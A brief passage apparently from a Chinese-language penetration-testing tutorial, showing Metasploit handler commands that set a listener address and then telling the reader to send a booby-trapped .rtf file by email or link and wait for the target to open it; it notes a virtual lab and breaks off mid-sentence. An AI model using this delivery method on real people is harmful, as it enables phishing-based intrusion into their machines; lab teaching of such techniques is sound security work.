    \n`msf exploit(handler) > set LHOST 192.168.10.10`\n`LHOST => LHOST 192.168.10.10`\n\
    `msf exploit(handler) >`\n\n就是这些！最后一步是将 .rtf 文件作为邮件附件或通过链接发送，并等待他们打开。由于我们使用的是虚拟系统，你可以将此文件复制到\
